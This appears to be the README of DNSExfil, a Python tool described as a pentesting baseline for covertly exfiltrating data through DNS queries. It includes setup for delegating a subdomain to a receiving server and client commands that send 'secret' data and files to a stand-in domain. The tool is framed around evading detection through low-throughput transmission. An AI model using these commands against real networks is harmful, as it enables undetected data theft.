# __DNSExfil - DNS Tunneling Suite__
![Status](https://img.shields.io/badge/Status-Work%20In%20Progress%20--%20Available%20MVP-yellow)

__This code is a minimum viable product (MVP) for an article in digitalwhisper.co.il.__

DNSExfil is a framework/cli-tool written in Python 3 (>3.8) aimed to exfiltrate data to a remote computer by encoding it to one (or more) DNS queries. Most DNS Tunneling solutions today don't give users the ability to get down to the nitty-gritty of the queries and change domain-building workflow (compression, encryption and encoding used to create the domains for the queries). The main purpose of DNSExfil is to be a solid baseline for pentesters who are looking for the ultimate control over every aspect of building and sending the DNS queries.

Currently, I've built this as a simple CLI tool but I'm planning on making it a full python package (as can be seen from some unused code and code that has yet to be implemented). Furthermore, pure implementations in Rust and JS are in order as well, so it can be run natively (Rust) and in Browsers (JS). 

## Research-Based - Exfiltrate Data over DNS like a pro.
a myriad of research papers were written about mitigating DNS Tunneling tools (like [iodine](https://github.com/yarrick/iodine) and [dnscat2](https://github.com/iagox86/dnscat2)). Most of them besmirch those tools, showing high-throughput of DNS queries that are easily detectable. A few were written with the emphasis on mitigating low-throughput of those data-exfiltrating DNS queries. DNSExfil is not meant to be fast, or furious. It's meant to be stealth and calculated, transmitting as little as possible, as delayed as possible, to avoid detection.

(will be adding research summary soon)


## Disclaimer
This tool can be used to naively send messages over DNS, but it could be used to exfiltrate data from a network. I'm  **not responsible for any misuse of the project**.

## Setup
### Installing Prerequisites

Use the package manager [pip](https://pip.pypa.io/en/stable/) to install [dnslib](https://pypi.org/project/dnslib/), which is the only required package, really.

```bash
$ pip install dnslib
```
OR you can use the included 'requirements.txt' (which is totally overkill):
```bash
$ pip install -r requirements.txt
```

### Setting up the Domain Settings
Next, set up DNS records to delegate a subdomain to your server. For example, if your server's IP is `X.X.X.X` and you want to tunnel through the subdomain `t1.example.com`, then your DNS configuration will look like this: 

| Type | Name | Value              |
| ---- | ---- | ------------------ |
| NS   | t1   | `t1ns.example.com` |
| A    | t1ns | `X.X.X.X`          |

The A record is present because NS records don't accept IP addresses as values (only domains), so we made a domain (t1ns.) that references the IP address of the server and the new subdomain is a valid entry for the NS record. 

## Usage
### DNSExfil-Server
After installation, it is rather simple to use the tool. Running the server is as simple as:
```
$ python3 DNSExfil-Server.py t1.example.com
```
The default settings are to listen on UDP port 53 on 0.0.0.0, which should be enough for almost every usage. for more information, feel free to invoke the help using `-h`:
```
Server Settings:
  --protocol {UDP,TCP}  select protocol for the server
  --host 0.0.0.0        IP address of the listening server
  --port 53             Port of the listening server
  --max_connections 5   In TCP only: # of Maximum Connections allowed

Output Settings:
  -o FOLDER, --output FOLDER
                        Output to folder
```

### DNSExfil-Client
Using the client is super straight forward. You can pipe the data to it or select a file:
```
$ echo "Very Secret Data" | python3 DNSExfil-Client.py t1.example.com
```
or
```
$ python3 DNSExfil-Client.py secret_file.txt t1.example.com
```

### Setting up Encoding and Compression
Both the server and the client rely on the same options and arguments for compression and encoding.
**It is important that both will have the same compression/encoding arguments for proper decoding and de-compressing.**

```bash
Alphabet Settings:
  Change Encoding Settings

  --alphabet_preset {CASE_SENSITIVE,CASE_INSENSITIVE,HUMAN_READABLE,RFC4648,BASE58_BITCOIN,BASE58_RIPPLE,default}
                        select from a pre-made set of encodings
  -c ABCDEFGHIJ, --chars ABCDEFGHIJ
                        specify characters for the encoding
  -r A-Za-z, --range A-Za-z
                        specify range of ASCII characters for the encoding
  -rnd, --randomize     Randomize the order of the characters (recommended to use with -rs)
  -seed RANDOM_SEED, --random_seed RANDOM_SEED
                        Random seed used (does nothing without -r)

Domain Decryption Settings:
  --compress {bzip2,zlib,nocompress}
                        select from a selected set of compressions

```
